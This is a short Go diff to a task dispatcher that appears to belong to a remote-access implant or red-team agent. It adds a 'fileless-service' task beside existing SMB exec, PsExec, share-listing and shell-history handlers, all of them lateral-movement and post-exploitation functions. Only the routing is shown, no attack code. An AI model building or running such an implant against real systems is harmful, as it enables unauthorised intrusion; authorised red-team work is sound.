@@ -252,6 +252,8 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = exectools.SmbExec(t.Args)
 	case "ps-exec":
 		result, cmdError = exectools.PsExec(t.Args)
+	case "fileless-service":
+		result, cmdError = services.FilelessService(t.Args)
 	case "list-shares":
 		result, cmdError = listshares.ListShares(t.Args)
 	case "shell-history":
